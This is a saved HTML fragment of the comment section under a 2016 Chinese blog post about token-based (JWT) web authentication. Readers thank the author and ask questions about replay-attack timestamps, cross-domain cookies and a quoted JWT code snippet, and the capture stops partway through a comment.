		<div class="postDesc">posted @ <span id="post-date">2016-06-22 15:25</span> <a href="http://www.cnblogs.com/xiekeli/">红心李</a> 阅读(<span id="post_view_count">84073</span>) 评论(<span id="post_comment_count">30</span>)  <a href="https://i.cnblogs.com/EditPosts.aspx?postid=5607107" rel="nofollow">编辑</a> <a href="http://www.cnblogs.com/xiekeli/p/5607107.html#" onclick="AddToWz(5607107);return false;">收藏</a></div>
	</div>
	<script src="./基于Token的WEB后台认证机制 - 红心李 - 博客园_files/highlight.min.js.下载"></script><script>markdown_highlight();</script><script type="text/javascript">var allowComments=true,cb_blogId=38393,cb_entryId=5607107,cb_blogApp=currentBlogApp,cb_blogUserGuid='683f420b-63cf-dd11-9e4d-001cf0cd104b',cb_entryCreatedDate='2016/6/22 15:25:00';loadViewCount(cb_entryId);</script>
	
</div><!--end: topics 文章、评论容器-->
</div><a name="!comments"></a><div id="blog-comments-placeholder"><div id="comments_pager_top"></div>
<br>
<div class="feedback_area_title">评论列表</div>
<div class="feedbackNoItems"></div>	

		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3456987" class="layer">#1楼</a><a name="3456987" id="comment_anchor_3456987"></a>  <span class="comment_date">2016-06-22 15:57</span> <a id="a_comment_author_3456987" href="http://www.cnblogs.com/yihaha/" target="_blank">DownUp</a> <a href="http://msg.cnblogs.com/send/DownUp" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3456987" class="blog_comment_body">赞，支持下  ，很全面</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3456987,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3456987,&#39;Bury&#39;,this)">反对(0)</a></div>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3457120" class="layer">#2楼</a><a name="3457120" id="comment_anchor_3457120"></a>  <span class="comment_date">2016-06-22 19:19</span> <a id="a_comment_author_3457120" href="http://www.cnblogs.com/esofar/" target="_blank">Esofar</a> <a href="http://msg.cnblogs.com/send/Esofar" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3457120" class="blog_comment_body">mark</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3457120,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3457120,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_3457120_avatar" style="display:none;">http://pic.cnblogs.com/face/785976/20170106142840.png</span>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3457149" class="layer">#3楼</a><a name="3457149" id="comment_anchor_3457149"></a>  <span class="comment_date">2016-06-22 21:31</span> <a id="a_comment_author_3457149" href="http://www.cnblogs.com/cike8899/" target="_blank">一别经年</a> <a href="http://msg.cnblogs.com/send/%E4%B8%80%E5%88%AB%E7%BB%8F%E5%B9%B4" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3457149" class="blog_comment_body">对于前后端分离来说JWT身份验证很有用！</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3457149,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3457149,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_3457149_avatar" style="display:none;">http://pic.cnblogs.com/face/545336/20150110092335.png</span>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3457532" class="layer">#4楼</a><a name="3457532" id="comment_anchor_3457532"></a>  <span class="comment_date">2016-06-23 13:13</span> <a id="a_comment_author_3457532" href="http://www.cnblogs.com/sunjie9606/" target="_blank">sunjie</a> <a href="http://msg.cnblogs.com/send/sunjie" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3457532" class="blog_comment_body">mark</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3457532,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3457532,&#39;Bury&#39;,this)">反对(0)</a></div>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3457767" class="layer">#5楼</a><a name="3457767" id="comment_anchor_3457767"></a>  <span class="comment_date">2016-06-23 17:36</span> <a id="a_comment_author_3457767" href="http://www.cnblogs.com/scy251147/" target="_blank">程序诗人</a> <a href="http://msg.cnblogs.com/send/%E7%A8%8B%E5%BA%8F%E8%AF%97%E4%BA%BA" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3457767" class="blog_comment_body">mark</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3457767,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3457767,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_3457767_avatar" style="display:none;">http://pic.cnblogs.com/face/47012/20131031113822.png</span>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3457928" class="layer">#6楼</a><a name="3457928" id="comment_anchor_3457928"></a>  <span class="comment_date">2016-06-24 00:06</span> <a id="a_comment_author_3457928" href="http://www.cnblogs.com/fit/" target="_blank">我不清楚是谁</a> <a href="http://msg.cnblogs.com/send/%E6%88%91%E4%B8%8D%E6%B8%85%E6%A5%9A%E6%98%AF%E8%B0%81" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3457928" class="blog_comment_body">可以的</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3457928,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3457928,&#39;Bury&#39;,this)">反对(0)</a></div>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3457997" class="layer">#7楼</a><a name="3457997" id="comment_anchor_3457997"></a>  <span class="comment_date">2016-06-24 09:24</span> <a id="a_comment_author_3457997" href="http://www.cnblogs.com/doNetTom/" target="_blank">_tom</a> <a href="http://msg.cnblogs.com/send/_tom" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3457997" class="blog_comment_body">mark 刚好在学oauth机制</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3457997,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3457997,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_3457997_avatar" style="display:none;">http://pic.cnblogs.com/face/426186/20160801090623.png</span>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3458009" class="layer">#8楼</a><a name="3458009" id="comment_anchor_3458009"></a>  <span class="comment_date">2016-06-24 09:44</span> <a id="a_comment_author_3458009" href="http://www.cnblogs.com/wuhuacong/" target="_blank">伍华聪</a> <a href="http://msg.cnblogs.com/send/%E4%BC%8D%E5%8D%8E%E8%81%AA" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3458009" class="blog_comment_body">我的混合框架中的Web API就是基于JWT的机制生成Token的，异曲同工之妙，呵呵。</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3458009,&#39;Digg&#39;,this)">支持(1)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3458009,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_3458009_avatar" style="display:none;">http://pic.cnblogs.com/face/u8867.png</span>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3458016" class="layer">#9楼</a><a name="3458016" id="comment_anchor_3458016"></a>  <span class="comment_date">2016-06-24 09:55</span> <a id="a_comment_author_3458016" href="http://www.cnblogs.com/Tpf386/" target="_blank">荆棘人</a> <a href="http://msg.cnblogs.com/send/%E8%8D%86%E6%A3%98%E4%BA%BA" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3458016" class="blog_comment_body">挺全面很不错，学习了！谢谢楼主！</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3458016,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3458016,&#39;Bury&#39;,this)">反对(0)</a></div>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3458020" class="layer">#10楼</a><a name="3458020" id="comment_anchor_3458020"></a>  <span class="comment_date">2016-06-24 10:02</span> <a id="a_comment_author_3458020" href="http://www.cnblogs.com/harvest/" target="_blank">↖(^o^)↗</a> <a href="http://msg.cnblogs.com/send/%E2%86%96%28%5Eo%5E%29%E2%86%97" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3458020" class="blog_comment_body">前两天看了篇英文的，懵懵懂懂的。楼主马上弄出个更详细的，顶一个！！！</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3458020,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3458020,&#39;Bury&#39;,this)">反对(0)</a></div>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3458030" class="layer">#11楼</a><a name="3458030" id="comment_anchor_3458030"></a>  <span class="comment_date">2016-06-24 10:21</span> <a id="a_comment_author_3458030" href="http://www.cnblogs.com/longware/" target="_blank">longware</a> <a href="http://msg.cnblogs.com/send/longware" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3458030" class="blog_comment_body">cas</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3458030,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3458030,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_3458030_avatar" style="display:none;">http://pic.cnblogs.com/face/u79428.gif</span>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3458156" class="layer">#12楼</a><a name="3458156" id="comment_anchor_3458156"></a>  <span class="comment_date">2016-06-24 13:18</span> <a id="a_comment_author_3458156" href="http://www.cnblogs.com/sparkdev/" target="_blank">sparkdev</a> <a href="http://msg.cnblogs.com/send/sparkdev" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3458156" class="blog_comment_body">收藏，学习中</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3458156,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3458156,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_3458156_avatar" style="display:none;">http://pic.cnblogs.com/face/952033/20160916141655.png</span>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3458192" class="layer">#13楼</a><a name="3458192" id="comment_anchor_3458192"></a>  <span class="comment_date">2016-06-24 14:16</span> <a id="a_comment_author_3458192" href="http://www.cnblogs.com/xjpz/" target="_blank">心尖偏左</a> <a href="http://msg.cnblogs.com/send/%E5%BF%83%E5%B0%96%E5%81%8F%E5%B7%A6" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3458192" class="blog_comment_body">mark</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3458192,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3458192,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_3458192_avatar" style="display:none;">http://pic.cnblogs.com/face/785677/20150726163334.png</span>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3461222" class="layer">#14楼</a><a name="3461222" id="comment_anchor_3461222"></a>  <span class="comment_date">2016-06-29 18:30</span> <a id="a_comment_author_3461222" href="http://home.cnblogs.com/u/254895/" target="_blank">疯狂地SL</a> <a href="http://msg.cnblogs.com/send/%E7%96%AF%E7%8B%82%E5%9C%B0SL" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3461222" class="blog_comment_body">mark</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3461222,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3461222,&#39;Bury&#39;,this)">反对(0)</a></div>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3484071" class="layer">#15楼</a><a name="3484071" id="comment_anchor_3484071"></a>  <span class="comment_date">2016-08-06 00:58</span> <a id="a_comment_author_3484071" href="http://www.cnblogs.com/plain-heart/" target="_blank">平常心成大事</a> <a href="http://msg.cnblogs.com/send/%E5%B9%B3%E5%B8%B8%E5%BF%83%E6%88%90%E5%A4%A7%E4%BA%8B" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3484071" class="blog_comment_body">看了后面关于防范"重放攻击"的方案, 我想问一下, 每次在请求目标api之前, 都要重新获取一次token 吗?</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3484071,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3484071,&#39;Bury&#39;,this)">反对(0)</a></div>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3486037" class="layer">#16楼</a><a name="3486037" id="comment_anchor_3486037"></a>  <span class="comment_date">2016-08-09 14:55</span> <a id="a_comment_author_3486037" href="http://home.cnblogs.com/u/608328/" target="_blank">HansonWu</a> <a href="http://msg.cnblogs.com/send/HansonWu" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3486037" class="blog_comment_body"><a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3458009" title="查看所回复的评论" onclick="commentManager.renderComments(0,50,3458009);">@</a>
伍华聪<br>哥 能讲一下啊你是怎么做的吗，我是新手，正接触这块的设计。</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3486037,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3486037,&#39;Bury&#39;,this)">反对(0)</a></div>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3495959" class="layer">#17楼</a><a name="3495959" id="comment_anchor_3495959"></a>  <span class="comment_date">2016-08-25 03:42</span> <a id="a_comment_author_3495959" href="http://www.cnblogs.com/sadkilo/" target="_blank">sadkilo</a> <a href="http://msg.cnblogs.com/send/sadkilo" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3495959" class="blog_comment_body">@红心李 <br>关于防范Replay Attacks <br>客户端生产时间戳,限制token 2秒内有效;然后服务端验证是否超时, <br>有一个问题: 如果客户端跟服务端的时间不同步,那岂不是客户端永远都无法被服务端承认了?</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3495959,&#39;Digg&#39;,this)">支持(3)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3495959,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_3495959_avatar" style="display:none;">http://pic.cnblogs.com/face/594871/20151024005932.png</span>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3506097" class="layer">#18楼</a><a name="3506097" id="comment_anchor_3506097"></a>  <span class="comment_date">2016-09-08 15:04</span> <a id="a_comment_author_3506097" href="http://home.cnblogs.com/u/330422/" target="_blank">clem</a> <a href="http://msg.cnblogs.com/send/clem" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3506097" class="blog_comment_body">总结得很好，谢谢啦！</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3506097,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3506097,&#39;Bury&#39;,this)">反对(0)</a></div>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3667939" class="layer">#19楼</a><a name="3667939" id="comment_anchor_3667939"></a>  <span class="comment_date">2017-04-14 12:00</span> <a id="a_comment_author_3667939" href="http://www.cnblogs.com/guangmangchen/" target="_blank">烛煌</a> <a href="http://msg.cnblogs.com/send/%E7%83%9B%E7%85%8C" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3667939" class="blog_comment_body">请问JWT签名放在cookie中怎么实现跨域？比如我Domain1登入了，Domain2中的cookie还是没有签名，一样会跳转到登入页？</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3667939,&#39;Digg&#39;,this)">支持(1)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3667939,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_3667939_avatar" style="display:none;">http://pic.cnblogs.com/face/u436034.jpg?id=09173532</span>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3681779" class="layer">#20楼</a><a name="3681779" id="comment_anchor_3681779"></a>  <span class="comment_date">2017-05-02 20:32</span> <a id="a_comment_author_3681779" href="http://www.cnblogs.com/mello/" target="_blank">MelloChan</a> <a href="http://msg.cnblogs.com/send/MelloChan" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3681779" class="blog_comment_body">apiKey.getSecret() <br> ????  apiKey在哪?</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3681779,&#39;Digg&#39;,this)">支持(1)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3681779,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_3681779_avatar" style="display:none;">http://pic.cnblogs.com/face/1016331/20160901103412.png</span>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3700308" class="layer">#21楼</a><a name="3700308" id="comment_anchor_3700308"></a>  <span class="comment_date">2017-05-25 09:03</span> <a id="a_comment_author_3700308" href="http://www.cnblogs.com/qin1088/" target="_blank">长风之子</a> <a href="http://msg.cnblogs.com/send/%E9%95%BF%E9%A3%8E%E4%B9%8B%E5%AD%90" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3700308" class="blog_comment_body">这种实现机制，可以针对webapi，也可以针对web浏览器中的页面，如果使用header增加jwt token的方法，可以实现跨域，但如果使用web浏览器是基于cookie机制的，如何定现跨域？望大神赐教</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3700308,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3700308,&#39;Bury&#39;,this)">反对(0)</a></div>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3705818" class="layer">#22楼</a><a name="3705818" id="comment_anchor_3705818"></a>  <span class="comment_date">2017-06-02 16:51</span> <a id="a_comment_author_3705818" href="http://home.cnblogs.com/u/850408/" target="_blank">DZG123</a> <a href="http://msg.cnblogs.com/send/DZG123" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3705818" class="blog_comment_body">作者是要 靠 别人来问 apiKey是什么嘛？</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3705818,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3705818,&#39;Bury&#39;,this)">反对(0)</a></div>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3707751" class="layer">#23楼</a><a name="3707751" id="comment_anchor_3707751"></a>  <span class="comment_date">2017-06-05 18:38</span> <a id="a_comment_author_3707751" href="http://www.cnblogs.com/Irving/" target="_blank">花儿笑弯了腰</a> <a href="http://msg.cnblogs.com/send/%E8%8A%B1%E5%84%BF%E7%AC%91%E5%BC%AF%E4%BA%86%E8%85%B0" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3707751" class="blog_comment_body">可以</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3707751,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3707751,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_3707751_avatar" style="display:none;">http://pic.cnblogs.com/face/365537/20140218233545.png</span>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3718904" class="layer">#24楼</a><a name="3718904" id="comment_anchor_3718904"></a>  <span class="comment_date">2017-06-20 19:50</span> <a id="a_comment_author_3718904" href="http://home.cnblogs.com/u/1186263/" target="_blank">keepflyer</a> <a href="http://msg.cnblogs.com/send/keepflyer" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3718904" class="blog_comment_body">好干货</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3718904,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3718904,&#39;Bury&#39;,this)">反对(0)</a></div>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3722463" class="layer">#25楼</a><a name="3722463" id="comment_anchor_3722463"></a>  <span class="comment_date">2017-06-26 09:45</span> <a id="a_comment_author_3722463" href="http://www.cnblogs.com/Tuizhi/" target="_blank">3dx退之</a> <a href="http://msg.cnblogs.com/send/3dx%E9%80%80%E4%B9%8B" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3722463" class="blog_comment_body">Nice</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3722463,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3722463,&#39;Bury&#39;,this)">反对(0)</a></div><span id="comment_3722463_avatar" style="display:none;">http://pic.cnblogs.com/face/1178626/20170607133955.png</span>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3732084" class="layer">#26楼</a><a name="3732084" id="comment_anchor_3732084"></a>  <span class="comment_date">2017-07-10 17:18</span> <a id="a_comment_author_3732084" href="http://home.cnblogs.com/u/483548/" target="_blank">glbfor</a> <a href="http://msg.cnblogs.com/send/glbfor" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3732084" class="blog_comment_body">auth_header = JWT.encode({<br>  user_id: 123,<br>  iat: Time.now.to_i,      # 指定token发布时间<br>  exp: Time.now.to_i + 2   # 指定token过期时间为2秒后，2秒时间足够一次HTTP请求，同时在一定程度确保上一次token过期，减少replay attack的概率；<br>}, "&lt;my shared secret&gt;")<br>RestClient.get("<a href="http://api.example.com/" target="_blank">http://api.example.com/</a>", authorization: auth_header)<br><br>请问，这个payload里面是不是漏了token。<br>不然，一旦秘钥被窃取，就脱缰了。。</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3732084,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3732084,&#39;Bury&#39;,this)">反对(0)</a></div>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
				<a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3732096" class="layer">#27楼</a><a name="3732096" id="comment_anchor_3732096"></a>  <span class="comment_date">2017-07-10 17:32</span> <a id="a_comment_author_3732096" href="http://home.cnblogs.com/u/483548/" target="_blank">glbfor</a> <a href="http://msg.cnblogs.com/send/glbfor" title="发送站内短消息" class="sendMsg2This">&nbsp;</a>
			</div>
			<div class="feedbackCon">
				<div id="comment_body_3732096" class="blog_comment_body"><a href="http://www.cnblogs.com/xiekeli/p/5607107.html#3700308" title="查看所回复的评论" onclick="commentManager.renderComments(0,50,3700308);">@</a>
长风之子<br>1.使用redis共享session。<br>2.服务端设为支持多个域。<br>3.自定义sessionid生成读取。 不使用容器session机制。<br>4.同时支持cookie或url参数作为token载体。<br>5.读取参数token或者cookie跟redis内容匹配，校验。<br>6.后面就一致了</div><div class="comment_vote"><a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3732096,&#39;Digg&#39;,this)">支持(0)</a><a href="javascript:void(0);" class="comment_bury" onclick="return voteComment(3732096,&#39;Bury&#39;,this)">反对(0)</a></div>
			</div>
		</div>
	
		<div class="feedbackItem">
			<div class="feedbackListSubtitle">
				<div class="feedbackManage">
					&nbsp;&nbsp;<span class="comment_actions"></span>
				</div>
